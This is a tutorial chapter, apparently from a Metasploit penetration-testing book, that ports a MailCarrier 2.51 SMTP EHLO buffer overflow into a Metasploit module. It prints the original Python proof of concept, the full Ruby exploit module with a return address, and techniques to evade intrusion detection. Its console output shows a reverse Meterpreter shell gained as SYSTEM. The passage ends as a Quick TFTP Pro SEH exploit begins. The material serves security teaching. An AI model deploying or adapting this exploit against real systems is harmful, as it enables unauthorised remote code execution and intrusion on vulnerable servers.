<html><head></head><body><section epub:type="chapter" id="porting_exploits_to_the_metasploit_frame"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 15. Porting Exploits to the Metasploit Framework</h2></div></div></div><p class="calibre2">You can choose to convert exploits to Metasploit from a different format for many reasons, not the least of which is to give back to the community and the Framework. Not all exploits are based on the Metasploit Framework; some are programmed in Perl and Python or C and C++.<a id="IDX-CHP-15-0001" class="strong"/></p><p class="calibre2">When you port exploits to Metasploit, you convert an existing stand-alone exploit, such as a Python or Perl script, for use within Metasploit. And, of course, after you have imported an exploit into the Framework, you can leverage the Framework’s many high-end tools to handle routine tasks, so that you can concentrate on what is unique about your particular exploit. In addition, although stand-alone exploits often depend on your using a certain payload or operating system, once ported to the Framework, payloads can be created on the fly and the exploit can be used in multiple scenarios.<a id="IDX-CHP-15-0002" class="strong"/></p><p class="calibre2">This chapter will walk you through the process of porting two stand-alone exploits to the Framework. With your knowledge of these basic concepts and a bit of hard work on your part, you should be able to begin porting exploits into the Framework yourself by the end of this chapter.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="assembly_language_basics">Assembly Language Basics</h2></div></div></div><p class="calibre2">To get the most out of this chapter, you’ll need a basic understanding of the assembly programming language. We use a lot of low-level assembly language instructions and commands in this chapter, so let’s take a look at the most common ones.<a id="IDX-CHP-15-0003" class="strong"/><a id="IDX-CHP-15-0004" class="strong"/><a id="IDX-CHP-15-0005" class="strong"/><a id="IDX-CHP-15-0006" class="strong"/><a id="IDX-CHP-15-0007" class="strong"/><a id="IDX-CHP-15-0008" class="strong"/><a id="IDX-CHP-15-0009" class="strong"/><a id="IDX-CHP-15-0010" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="eip_and_esp_registers">EIP and ESP Registers</h3></div></div></div><p class="calibre2"><span class="strong"><em class="calibre4">Registers</em></span> are placeholders that store information, perform calculations, or hold values that an application needs in order to run. The two most important registers for the purposes of this chapter are <span class="strong"><em class="calibre4">EIP</em></span>, the extended instruction pointer register, and <span class="strong"><em class="calibre4">ESP</em></span>, the extended starter pointer register.</p><p class="calibre2">The value in EIP tells the application where to go after it has executed some code. In this chapter, we’ll overwrite our EIP return address and tell it to point to our malicious shellcode. The ESP register is where, in our buffer overflow exploit, we would overwrite the normal application data with our malicious code to cause a crash. The ESP register is essentially a memory address and placeholder for our malicious shellcode.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="the_jmp_instruction_set">The JMP Instruction Set</h3></div></div></div><p class="calibre2">The <span class="strong"><em class="calibre4">JMP instruction set</em></span> is the “jump” to the ESP memory address. In the overflow example that we’ll explore in this chapter, we use the JMP ESP instruction set to tell the computer to go to the ESP memory address that happens to contain our shellcode.<a id="IDX-CHP-15-0011" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="nops_and_nop_slides">NOPs and NOP Slides</h3></div></div></div><p class="calibre2">A <span class="strong"><em class="calibre4">NOP</em></span> is a no-operation instruction. Sometimes when you trigger an overflow, you won’t know exactly where you’re going to land within the space allocated. A NOP instruction simply says to the computer “Don’t do anything if you see me,” and it is represented by a \x90 in hexadecimal.</p><p class="calibre2">A <span class="strong"><em class="calibre4">NOP slide</em></span> is a handful of NOPs, combined to create a slide to our shellcode. When we go through and actually trigger the JMP ESP instructions, we will hit a bunch of NOPs, which will slide down until we hit our shellcode.</p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="porting_a_buffer_overflow">Porting a Buffer Overflow</h2></div></div></div><p class="calibre2">Our first example is a typical remote buffer overflow that needs only a jump to the extended stack pointer (JMP ESP) instruction to reach the shellcode. This exploit, called the “MailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow Exploit,” uses MailCarrier 2.51 SMTP commands to cause a buffer overflow.<a id="IDX-CHP-15-0012" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">You’ll find the exploit and a vulnerable application at <a class="xref" href="http://www.exploit-db.com/exploits/598/" target="_top">http://www.exploit-db.com/exploits/598/</a>.</p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">But this is an older exploit, originally written for Windows 2000. When you run it now, it doesn’t work quite as you’d expect. Conveniently, a Metasploit module is already in the Framework to implement this exploit, although it could use some improvement. After a little time investigating with varying buffer lengths, you will find that more than 1000 bytes are available for shellcode, and the buffer length needs to be adjusted by 4 bytes. (For more information on how this is accomplished, read “Exploit Writing Tutorial Part 1: Stack Based Overflows,” at <a class="xref" href="http://www.exploit-db.com/download_pdf/13535/" target="_top">http://www.exploit-db.com/download_pdf/13535/</a>.) The new proof of concept for this exploit follows: We have removed the shellcode and replaced the jump instruction with a string (<span class="strong"><em class="calibre4">AAAA</em></span>) to overwrite the EIP register. (Proof of concept exploits contain the basic code necessary to demonstrate the exploit but do not carry an actual payload, and in many cases they require heavy modifications before they will work properly.)<a id="IDX-CHP-15-0013" class="strong"/><a id="IDX-CHP-15-0014" class="strong"/></p><a id="I_programlisting15_d1e17234" class="strong"/><pre class="programlisting">#!/usr/bin/python
#########################################################
# MailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow     #
# Advanced, secure and easy to use Mail Server.         #
# 23 Oct 2004 - muts                                    #
#########################################################

import struct
import socket

print "\n\n###############################################"
print "\nMailCarrier 2.51 SMTP EHLO / HELO Buffer Overflow"
print "\nFound &amp; coded by muts [at] whitehat.co.il"
print "\nFor Educational Purposes Only!\n"
print "\n\n###############################################"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "\x41" * 5093
buffer += "\42" * 4
buffer += "\x90" * 32
buffer += "\xcc" * 1000

try:
    print "\nSending evil buffer..."
    s.connect(('192.168.1.155',25))
    s.send('EHLO ' + buffer + '\r\n')
    data = s.recv(1024)
    s.close()
    print "\nDone!"
except:
    print "Could not connect to SMTP!"</pre><p class="calibre2">As you might imagine, the easiest and fastest way to port a stand-alone exploit to Metasploit is to modify a similar one from the Framework. And that’s what we’ll do next.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="stripping_the_existing_exploit">Stripping the Existing Exploit</h3></div></div></div><p class="calibre2">As our first step in porting the MailCarrier exploit, we’ll strip down the existing Metasploit module to a simple skeleton file, as shown here:<a id="IDX-CHP-15-0015" class="strong"/><a id="IDX-CHP-15-0016" class="strong"/><a id="IDX-CHP-15-0017" class="strong"/></p><a id="I_programlisting15_d1e17258" class="strong"/><pre class="programlisting">require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
        Rank = GoodRanking
             <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>include Msf::Exploit::Remote::Tcp

        def initialize(info = {})
            super(update_info(info,
                  'Name'             =&gt; 'TABS MailCarrier v2.51 SMTP EHLO Overflow',
                       'Description' =&gt; %q{
                       This module exploits the MailCarrier v2.51 suite SMTP service.
                       The stack is overwritten when sending an
 overly long EHLO command.
                       },
                       'Author'      =&gt; [ 'Your Name' ],
                       'Arch'        =&gt; [ ARCH_X86 ],
                       'License'     =&gt; MSF_LICENSE,
                       'Version'     =&gt; '$Revision: 7724 $',
                       'References'  =&gt;
                        [
                              [ 'CVE', '2004-1638' ],
                              [ 'OSVDB', '11174' ],
                              [ 'BID', '11535' ],
                              [ 'URL', 'http://www.exploit-db.com/exploits/598' ],
                       ],
                       'Privileged'          =&gt; true,
                       'DefaultOptions'      =&gt;
                       {
                              'EXITFUNC'     =&gt; 'thread',
                       },
                       'Payload' =&gt;
                              {
                                      'Space'                =&gt; 300,
                                      'BadChars'             =&gt; "\x00\x0a\x0d\x3a",
                                      'StackAdjustment'      =&gt; −3500,
                              },
                       'Platform' =&gt; ['win'],
                       'Targets'  =&gt;
                       [
                                   <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>[ 'Windows XP SP2 - EN', { 'Ret'
 =&gt; <strong class="calibre3"><code class="calibre6">0xdeadbeef</code></strong> } ],
                       ],
                       'DisclosureDate' =&gt; 'Oct 26 2004',
                       'DefaultTarget'  =&gt; 0))

                       register_options(
                        [
                                     <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>Opt::RPORT(<strong class="calibre3"><code class="calibre6">25</code></strong>),
                              Opt::LHOST(), # Required for stack offset
                        ], self.class)
       end

       def exploit
              connect

                 <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>sock.put(sploit + "\r\n")

              handler
              disconnect
       end

end</pre><p class="calibre2">Because this exploit does not require authentication, we need only the mixin <code class="literal">Msf::Exploit::Remote::Tcp</code> shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17296" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. We’ve discussed mixins in previous chapters; you’ll recall that mixins allow you to use built-in protocols such as <code class="literal">Remote::Tcp</code> to perform basic remote TCP communications.<a id="IDX-CHP-15-0018" class="strong"/><a id="IDX-CHP-15-0019" class="strong"/><a id="IDX-CHP-15-0020" class="strong"/><a id="IDX-CHP-15-0021" class="strong"/><a id="IDX-CHP-15-0022" class="strong"/><a id="IDX-CHP-15-0023" class="strong"/><a id="IDX-CHP-15-0024" class="strong"/><a id="IDX-CHP-15-0025" class="strong"/><a id="IDX-CHP-15-0026" class="strong"/></p><p class="calibre2">In the preceding listing, the target return address is set to the bogus value <code class="literal">Oxdeadbeef</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17344" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, and the default TCP port is set to <code class="literal">25</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17353" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. Upon connecting to the target, Metasploit will send the malicious attack using <code class="literal">sock.put</code> as shown at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17363" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> and craft our exploit for us.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="configuring_the_exploit_definition">Configuring the Exploit Definition</h3></div></div></div><p class="calibre2">Let’s look at how we initially configure our exploit definition. We will need to feed the service a greeting as required by the protocol, a large buffer, a placeholder where we will take control of EIP, a brief NOP slide, and a placeholder for our shellcode. Here’s the code:</p><a id="I_programlisting15_d1e17374" class="strong"/><pre class="programlisting">def exploit
       connect

     <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>sploit = "<strong class="calibre3"><code class="calibre6">EHLO</code></strong> "
     <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>sploit &lt;&lt; "\x41" * <strong class="calibre3"><code class="calibre6">5093</code></strong>
     <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>sploit &lt;&lt; "\x42" * <strong class="calibre3"><code class="calibre6">4</code></strong>
     <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>sploit &lt;&lt; "<strong class="calibre3"><code class="calibre6">\x90</code></strong>" * 32
     <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>sploit &lt;&lt; "<strong class="calibre3"><code class="calibre6">\xcc</code></strong>" * 1000

       sock.put(sploit + "\r\n")

       handler
       disconnect
end</pre><p class="calibre2">The malicious buffer is built based on the original exploit code beginning with the <code class="literal">EHLO</code> command at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17427" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> followed by a long string of <span class="strong"><em class="calibre4">A</em></span>s at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17436" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> (5093 of them), 4 bytes to overwrite the EIP register at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17442" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, a small NOP slide at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17449" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>, and then some dummy shellcode at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17455" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span>.</p><p class="calibre2">In this case, we’ve selected an interrupt (breakpoint) at <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17463" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> so that execution will pause when it reaches our shellcode without us having to set a breakpoint.<a id="IDX-CHP-15-0027" class="strong"/><a id="IDX-CHP-15-0028" class="strong"/><a id="IDX-CHP-15-0029" class="strong"/><a id="IDX-CHP-15-0030" class="strong"/><a id="IDX-CHP-15-0031" class="strong"/><a id="IDX-CHP-15-0032" class="strong"/><a id="IDX-CHP-15-0033" class="strong"/></p><p class="calibre2">Having configured the exploit section, we save the file as <span class="strong"><em class="calibre4">mailcarrier_book.rb</em></span> at <span class="strong"><em class="calibre4">modules/exploits/windows/smtp/</em></span>.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="testing_our_base_exploit">Testing Our Base Exploit</h3></div></div></div><p class="calibre2">In the next step, we load the module in <span class="strong"><em class="calibre4">msfconsole</em></span>, set the required options, and configure a payload of <code class="literal">generic/debug_trap</code> (a great payload for exploit development that triggers a stop point when you are tracing the application in a debugger). Then we run the module:</p><a id="I_programlisting15_d1e17517" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use exploit/windows/smtp/mailcarrier_book</code></strong>
  msf exploit(mailcarrier_book) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

  Module options:

     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST                   yes       The local address
     RHOST                   yes       The target address
     RPORT  25               yes       The target port


  Exploit target:

     Id  Name
     --  ----
     0   Windows XP SP2 - EN


  msf exploit(mailcarrier_book) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 192.168.1.101</code></strong>
  LHOST =&gt; 192.168.1.101
  msf exploit(mailcarrier_book) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 192.168.1.155</code></strong>
  RHOST =&gt; 192.168.1.155
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> msf exploit(mailcarrier_book) &gt; <strong class="calibre3"><code class="calibre6">set payload generic/debug_trap</code></strong>
  payload =&gt; generic/debug_trap
  msf exploit(mailcarrier_book) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>
  [*] Exploit completed, but no session was created.
  msf exploit(mailcarrier_book) &gt;</pre><p class="calibre2">We set the options as if we were running a normal exploit, except that we use the <code class="literal">generic/debug_trap</code> payload <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17549" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> to test our exploit.</p><p class="calibre2">After the module runs, the debugger should pause with EIP overwritten by <span class="strong"><em class="calibre4">42424242</em></span> as shown in <a class="xref" href="part0019.html#mailcarrier_initial_overwrite">Figure 15-1</a>; if you see a successful EIP overwrite of <span class="strong"><em class="calibre4">42424242</em></span>, you know your exploit is working. Notice in <a class="xref" href="part0019.html#mailcarrier_initial_overwrite">Figure 15-1</a> that the EIP register points to 42424242 and that the NOP slide and the dummy payload have made it into the buffer as expected.</p><div class="figure"><a id="mailcarrier_initial_overwrite" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject15_d1e17570" class="strong"/><img src="../images/00054.jpeg" alt="MailCarrier initial overwrite" hisrc="httpatomoreillycomsourcenostarchimages867562.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 15-1. MailCarrier initial overwrite</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="implementing_features_of_the_framework">Implementing Features of the Framework</h3></div></div></div><p class="calibre2">Having proved that the basic skeleton of the module works by overwriting our EIP address, we can slowly start to implement the features of the Framework. We begin by setting the target return address (shown in bold in the following example) in the <code class="literal">'Targets'</code> block to a JMP ESP address. This is the same address that was used in the original exploit; it’s found in <span class="strong"><em class="calibre4">SHELL32.DLL</em></span> on Windows XP SP2. We need to find a legitimate return address to ensure that our code executes properly on the operating system we are targeting. Remember that some exploits work only on specific operating systems, as is the case with this exploit. We are using an address from <span class="strong"><em class="calibre4">SHELL32.DLL</em></span>, which will change across different versions or service packs. If we were to find a standard JMP ESP in the application’s memory address, we would not need to use a Windows DLL and could make this exploit universal to all Windows platforms, because the memory addresses would never change.<a id="IDX-CHP-15-0034" class="strong"/><a id="IDX-CHP-15-0035" class="strong"/><a id="IDX-CHP-15-0036" class="strong"/><a id="IDX-CHP-15-0037" class="strong"/><a id="IDX-CHP-15-0038" class="strong"/><a id="IDX-CHP-15-0039" class="strong"/></p><a id="I_programlisting15_d1e17614" class="strong"/><pre class="programlisting">'Targets' =&gt;
       [
              [ 'Windows XP SP2 - EN', { 'Ret' =&gt; <strong class="calibre3"><code class="calibre6">0x7d17dd13</code></strong> } ],
       ],</pre><p class="calibre2">Metasploit will add the return address into the exploit at run time. You can replace the return address in the exploit block with <code class="literal">[target['Ret']].pack('V')</code>. This will insert the target return address into the exploit, reversing the bytes in little-endian format. (The endian-ness is determined by the target CPU’s architecture, and processors that are Intel-compatible use little-endian byte ordering.)<a id="IDX-CHP-15-0040" class="strong"/><a id="IDX-CHP-15-0041" class="strong"/><a id="IDX-CHP-15-0042" class="strong"/></p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">If you declared more than one target, this particular line would select the proper return address based on the target you selected when running the exploit. Notice how moving the exploit to the Framework is already adding versatility.<a id="IDX-CHP-15-0043" class="strong"/><a id="IDX-CHP-15-0044" class="strong"/><a id="IDX-CHP-15-0045" class="strong"/><a id="IDX-CHP-15-0046" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div><a id="I_programlisting15_d1e17654" class="strong"/><pre class="programlisting">sploit = "EHLO "
sploit &lt;&lt; "\x41" * 5093
sploit &lt;&lt; [target['Ret']].pack('V')
sploit &lt;&lt; "\x90" * 32
sploit &lt;&lt; "\xcc" * 1000</pre><p class="calibre2">Re-executing the exploit module should result in a successful jump to the INT3 dummy shellcode instructions, as shown in <a class="xref" href="part0019.html#a_successful_jump_to_dummy_shellcode_sem">Figure 15-2</a>.<a id="IDX-CHP-15-0047" class="strong"/></p><div class="figure"><a id="a_successful_jump_to_dummy_shellcode_sem" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject15_d1e17666" class="strong"/><img src="../images/00055.jpeg" alt="A successful jump to dummy shellcode; we are at our user control’s INT3 instructions." hisrc="httpatomoreillycomsourcenostarchimages867564.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 15-2. A successful jump to dummy shellcode; we are at our user control’s INT3 instructions.</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="adding_randomization">Adding Randomization</h3></div></div></div><p class="calibre2">Most intrusion detections systems will trigger an alert when they detect a long string of <span class="strong"><em class="calibre4">A</em></span>s traversing the network, because this is a common buffer pattern for exploits. Therefore, it’s best to introduce as much randomization as possible into your exploits, because doing so will break many exploit-specific signatures.</p><p class="calibre2">To add randomness to this exploit, edit the <code class="literal">'Targets'</code> section in the super block to include the offset amount required prior to overwriting EIP, as shown here:</p><a id="I_programlisting15_d1e17684" class="strong"/><pre class="programlisting">'Targets' =&gt;
       [
                 <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>[ 'Windows XP SP2 - EN', { 'Ret' =&gt;
 0x7d17dd13, <strong class="calibre3"><code class="calibre6">'Offset' =&gt; 5093</code></strong> } ],
       ],</pre><p class="calibre2">By declaring the <code class="literal">Offset</code> here <span class="inlinemediaobject"><a id="I_inlinemediaobject15_d1e17700" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, you will no longer need to include the string of <span class="strong"><em class="calibre4">A</em></span>s manually in the exploit itself. This is a very useful feature, because in some cases the buffer length will differ across different operating system versions.<a id="IDX-CHP-15-0048" class="strong"/><a id="IDX-CHP-15-0049" class="strong"/><a id="IDX-CHP-15-0050" class="strong"/><a id="IDX-CHP-15-0051" class="strong"/><a id="IDX-CHP-15-0052" class="strong"/><a id="IDX-CHP-15-0053" class="strong"/><a id="IDX-CHP-15-0054" class="strong"/><a id="IDX-CHP-15-0055" class="strong"/></p><p class="calibre2">We can now edit the exploit section to have Metasploit generate a random string of uppercase alphabetic characters instead of the 5093 <span class="strong"><em class="calibre4">A</em></span>s at runtime. From this point on, each run of the exploit will have a unique buffer. (We’ll use <code class="literal">rand_text_alpha_upper</code> to accomplish this, but we aren’t limited to this one engine. To see all available text formats, see the <span class="strong"><em class="calibre4">text.rb</em></span> file located on Back|Track under <span class="strong"><em class="calibre4">/opt/metasploit/msf3/lib/rex/</em></span>.)</p><a id="I_programlisting15_d1e17760" class="strong"/><pre class="programlisting">sploit = "EHLO "
sploit &lt;&lt; <strong class="calibre3"><code class="calibre6">rand_text_alpha_upper</code></strong>(target['Offset']
sploit &lt;&lt; [target['Ret']].pack('V')
sploit &lt;&lt; "\x90" * 32
sploit &lt;&lt; "\xcc" * 1000</pre><p class="calibre2">As you can see, the string of <span class="strong"><em class="calibre4">A</em></span>s will be replaced with a random string of uppercase alphanumeric characters. And when we run the module again, it still works properly.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="removing_the_nop_slide">Removing the NOP Slide</h3></div></div></div><p class="calibre2">Our next step is to remove the very obvious NOP slide, because this is another item that often triggers intrusion detection systems. Although <code class="literal">\x90</code> is the best-known no-operation instruction, it isn’t the only one available. We can use the <code class="literal">make_nops()</code> function to tell Metasploit to use random NOP-equivalent instructions in the module:</p><a id="I_programlisting15_d1e17782" class="strong"/><pre class="programlisting">sploit = "EHLO "
sploit &lt;&lt; rand_text_alpha_upper(target['Offset'])
sploit &lt;&lt; [target['Ret']].pack('V')
sploit &lt;&lt; <strong class="calibre3"><code class="calibre6">make_nops(32)</code></strong>
sploit &lt;&lt; "\xcc" * 1000</pre><p class="calibre2">We run the module again and check our debugger, which should be paused again on the INT3 instructions. The familiar NOP slide has been replaced by seemingly random characters, as shown in <a class="xref" href="part0019.html#randomized_mailcarrier_buffer">Figure 15-3</a>.<a id="IDX-CHP-15-0056" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="removing_the_dummy_shellcode">Removing the Dummy Shellcode</h3></div></div></div><p class="calibre2">With everything in the module working correctly, we can now remove the dummy shellcode. The encoder will exclude the bad characters declared in the module super block.</p><a id="I_programlisting15_d1e17799" class="strong"/><pre class="programlisting">sploit = "EHLO "
sploit &lt;&lt; rand_text_alpha_upper(target['Offset'])
sploit &lt;&lt; [target['Ret']].pack('V')
sploit &lt;&lt; make_nops(32)
sploit &lt;&lt; <strong class="calibre3"><code class="calibre6">payload.encoded</code></strong></pre><div class="figure"><a id="randomized_mailcarrier_buffer" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject15_d1e17806" class="strong"/><img src="../images/00056.jpeg" alt="Randomized MailCarrier buffer" hisrc="httpatomoreillycomsourcenostarchimages867566.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 15-3. Randomized MailCarrier buffer</div></div><p class="calibre2">The <code class="literal">payload.encoded</code> function tells Metasploit to append the indicated payload to the end of the malicious string at run time.<a id="IDX-CHP-15-0057" class="strong"/><a id="IDX-CHP-15-0058" class="strong"/><a id="IDX-CHP-15-0059" class="strong"/></p><p class="calibre2">Now, when we load our module, set a real payload, and execute it, we should be presented with our hard-earned shell, as shown here:</p><a id="I_programlisting15_d1e17833" class="strong"/><pre class="programlisting">msf exploit(mailcarrier_book) &gt; <strong class="calibre3"><code class="calibre6">set payload windows/meterpreter/reverse_tcp</code></strong>
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(mailcarrier_book) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Started reverse handler on 192.168.1.101:4444
[*] Sending stage (747008 bytes)
[*] Meterpreter session 1 opened (192.168.1.101:4444 -&gt; 192.168.1.155:1265)

meterpreter &gt; <strong class="calibre3"><code class="calibre6">getuid</code></strong>
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt;</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="our_completed_module">Our Completed Module</h3></div></div></div><p class="calibre2">Just to wrap things up, here is the complete and final code for this Metasploit exploit module:</p><a id="I_programlisting15_d1e17849" class="strong"/><pre class="programlisting">require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
       Rank = GoodRanking

       include Msf::Exploit::Remote::Tcp

       def initialize(info = {})
              super(update_info(info,
                     'Name'           =&gt; 'TABS MailCarrier v2.51 SMTP EHLO Overflow',
                     'Description'    =&gt; %q{
                     This module exploits the MailCarrier v2.51 suite SMTP service.
                     The stack is overwritten when sending
 an overly long EHLO command.
                     },
                     'Author'         =&gt; [ 'Your Name' ],
                     'Arch'           =&gt; [ ARCH_X86 ],
                     'License'        =&gt; MSF_LICENSE,
                     'Version'        =&gt; '$Revision: 7724 $',
                     'References'     =&gt;
                     [
                              [ 'CVE', '2004-1638' ],
                              [ 'OSVDB', '11174' ],
                              [ 'BID', '11535' ],
                              [ 'URL', 'http://www.exploit-db.com/exploits/598' ],
                     ],
                     'Privileged'            =&gt; true,
                     'DefaultOptions'        =&gt;
                     {
                              'EXITFUNC'     =&gt; 'thread',
                     },
                     'Payload' =&gt;
                              {
                                      'Space'               =&gt; 1000,
                                      'BadChars'            =&gt; "\x00\x0a\x0d\x3a",
                                      'StackAdjustment'     =&gt; −3500,
                              },
                     'Platform' =&gt; ['win'],
                     'Targets'  =&gt;
                     [
                              [ 'Windows XP SP2 - EN',
 { 'Ret' =&gt; 0x7d17dd13, 'Offset' =&gt; 5093 } ],
                     ],
                     'DisclosureDate' =&gt; 'Oct 26 2004',
                     'DefaultTarget'  =&gt; 0))

                     register_options(
                     [
                              Opt::RPORT(25),
                              Opt::LHOST(), # Required for stack offset
                     ], self.class)
        end

        def exploit
              connect

              sploit = "EHLO "
              sploit &lt;&lt; rand_text_alpha_upper(target['Offset'])
              sploit &lt;&lt; [target['Ret']].pack('V')
              sploit &lt;&lt; make_nops(32)
              sploit &lt;&lt; payload.encoded
              sock.put(sploit + "\r\n")

              handler
              disconnect
        end

end</pre><p class="calibre2">You’ve just completed your first port of a buffer overflow exploit to Metasploit!<a id="IDX-CHP-15-0060" class="strong"/><a id="IDX-CHP-15-0061" class="strong"/><a id="IDX-CHP-15-0062" class="strong"/><a id="IDX-CHP-15-0063" class="strong"/></p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="seh_overwrite_exploit">SEH Overwrite Exploit</h2></div></div></div><p class="calibre2">In our next example, we’ll convert a Structured Exception Handler (SEH) overwrite exploit for Quick TFTP Pro 2.1 to Metasploit. SEH overwrites occur when you overwrite the pointer to the applications exception handler. In this particular exploit, the application triggers an exception, and when it arrives at the pointer over which you have control, you can direct execution flow to your shellcode. The exploit itself is a bit more complex than a simple buffer overflow, but it’s very elegant. In an SEH overwrite, we attempt to bypass the handler that tries to close an application gracefully when a major error or crash occurs.<a id="IDX-CHP-15-0064" class="strong"/></p><p class="calibre2">In the balance of this chapter, we’ll use the <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> technique to allow us to access our attacker-controlled memory space and gain full code execution. The <span class="strong"><em class="calibre4">POP-POP-RETN</em></span> technique is commonly used to try to get around the SEH and execute our own code. The first <span class="strong"><em class="calibre4">POP</em></span> in assembly pulls a memory address from the stack, essentially removing one memory address instruction. The second <span class="strong"><em class="calibre4">POP</em></span> also pulls a memory address from the stack. The <span class="strong"><em class="calibre4">RETN</em></span> returns us to a user-controlled area of the code, where we can begin executing our memory instructions.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">To learn more about SEH overwrites, see <a class="xref" href="http://www.exploit-db.com/download_pdf/10195/" target="_top">http://www.exploit-db.com/download_pdf/10195/</a>.</p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">The Quick TFTP Pro 2.1 exploit was written by Muts. You can find the code for the complete exploit as well as the application at <a class="xref" href="http://www.exploit-db.com/exploits/5315/" target="_top">http://www.exploit-db.com/exploits/5315/</a>. We’ve stripped down the exploit here to make it simpler to port into Metasploit — for example, we’ve stripped out the payload. The remaining skeleton has all of the information we’ll need to use the exploit in Metasploit.<a id="IDX-CHP-15-0065" class="strong"/></p><a id="I_programlisting15_d1e17906" class="strong"/><pre class="programlisting">#!/usr/bin/python
# Quick TFTP Pro 2.1 SEH Overflow (0day)
